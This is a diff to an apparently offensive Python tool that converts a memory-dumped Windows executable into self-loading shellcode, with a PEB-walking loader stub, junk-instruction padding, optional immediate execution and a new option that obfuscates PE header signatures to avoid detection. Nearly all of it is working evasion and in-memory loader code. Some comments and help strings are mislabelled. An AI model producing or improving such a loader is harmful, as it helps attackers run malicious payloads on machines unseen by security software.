@@ -91,7 +91,7 @@ def generate_nop_sequence(desired_length):
         {"instruction": [0x66, 0x83, 0xc2, 0x00], "length": 4},  # add dx, 0
         {"instruction": [0x0F, 0x1F, 0x40, 0x00], "length": 4},  # 4-byte NOP
         {"instruction": [0x48, 0xff, 0xc0, 0x48, 0xff, 0xc8], "length": 6},  # inc rax; dec rax;
-        {"instruction": [0x49, 0xf7, 0xd8, 0x49, 0xf7, 0xd8], "length": 6},  # neg r8; neg r8;
+        {"instruction": [0x49, 0xf7, 0xd8, 0x49, 0xf7, 0xd8], "length": 6},  # neg r8; neg 48;
         {"instruction": [0x48, 0x83, 0xc0, 0x01, 0x48, 0xff, 0xc8], "length": 7},  # add rax,0x1; dec rax;
         {"instruction": [0x48, 0x83, 0xe9, 0x2, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc1], "length": 10},  # sub rcx, 2; inc rcx; inc rcx
     ]
@@ -150,17 +150,19 @@ def modify_pe_signatures(segments):
 if __name__ == "__main__":
     print_banner()
     parser = argparse.ArgumentParser(description='Dynamically generate shellcode stub to append to the dump file')
-    parser.add_argument('--bin', '-b', required=True, dest='bin',help='The binary file dumped by DumpPEFromMemory.exe')
+    parser.add_argument('--file', '-f', required=True, dest='input_file',help='The input binary file dumped by DumpPEFromMemory.exe')
     parser.add_argument('--cmdline', '-c', required=False, default="", dest='cmdline',help='Supplied command line')
-    parser.add_argument('--output', '-o', required=True, dest='output',help='Save the PIC code as a bin file')
+    parser.add_argument('--bin', '-b', required=True, dest='bin',help='Save the PIC code as a bin file')
+    parser.add_argument('--obfuscate', '-o', required=False, default="false", dest='obfus',help='Save the PIC code as a bin file')
     parser.add_argument('--execution', '-e', required=False, default='False', dest='sc_exec',help='(Only Windows) Immediately execute shellcoded PE? True/False')
 
     args = parser.parse_args()
-    bin= args.bin
+    input_file= args.input_file
     cmdline = args.cmdline
-    output = args.output
+    bin = args.bin
     sc_exec = args.sc_exec
-    pe_array = read_dump_file(bin)
+    obfus = args.obfus
+    pe_array = read_dump_file(input_file)
     update_cmdline_asm = generate_asm_by_cmdline(cmdline)	# Generate shellcode that used to update command line
 
 
@@ -247,12 +249,6 @@ f"{update_cmdline_asm}"
 )
 
 
-
-
-
-
-
-
     ks = Ks(KS_ARCH_X86, KS_MODE_64)
     encoding, count = ks.asm(CODE)
     CODE_LEN = len(encoding) + 25     
@@ -262,14 +258,12 @@ f"{update_cmdline_asm}"
 
     segments = [{0x3c: 4}, {e_lfanew+0x28: 4}, {e_lfanew+0x30: 8}, {e_lfanew+0x50: 4}, {e_lfanew+0x90: 8}, {e_lfanew+0xb0: 8}, {e_lfanew+0xf0: 8}] # Segments in PE header that need to be intact
 # e_lfanew, entry point, preferred address, size of image, export directory, import directory, baserelocation directory, delayed import directory 
-    obfuscated_signatures = modify_pe_signatures(segments)
+    if obfus.lower() == "true": 
+        print("[!] Depending on the program, obfuscation may not be compatible with it. Make sure you know how does the program work!")
+        obfuscated_signatures = modify_pe_signatures(segments)
+    else:
+        obfuscated_signatures = ""
     print(obfuscated_signatures+"\n")
-
-
-
-
-
-
 
 
     CODE2 = (
@@ -512,11 +506,11 @@ f"{obfuscated_signatures}"
 " inc rdx;"
 " xor r8, r8;"
 " push r13;"				# Save GetProcAddress
-" push r13;"
+" push rcx;"				# Save Image Base
 " sub rsp, 0x30;"
 " call rbx;"
 " add rsp, 0x30;"
-" pop r13;"				# Recover GetProcAddress
+" pop rcx;"				# Recover GetProcAddress
 " pop r13;"
 " xor rdx, rdx;"
 " mov rax, gs:[rdx+0x60];"		# RAX = PEB Address
@@ -557,15 +551,19 @@ f"{obfuscated_signatures}"
 
     nop_segments = generate_nop_sequence(0x1000-len(shellcode))	# Pad the shellcode stub up to 0x1000 bytes
 
-    merged_shellcode = shellcode + nop_segments + obfuscate_header(pe_array[0:0x1000], segments) + pe_array[0x1000:] 
+    if obfus.lower() == "true": 
+        merged_shellcode = shellcode + nop_segments + obfuscate_header(pe_array[0:0x1000], segments) + pe_array[0x1000:] 
+    else:
+        merged_shellcode = shellcode + nop_segments + pe_array
+
     print("[!] Shellcoded PE's size: "+str(len(merged_shellcode))+" bytes\n\n")
     print_shellcode(merged_shellcode)
 
 
     try:
-        with open(output, 'wb') as f:
+        with open(bin, 'wb') as f:
             f.write(merged_shellcode)
-            print("\n\nGenerated shellcode successfully saved in file "+output)
+            print("\n\nGenerated shellcode successfully saved in file "+bin)
     except Exception as e:
         print(e)
 	
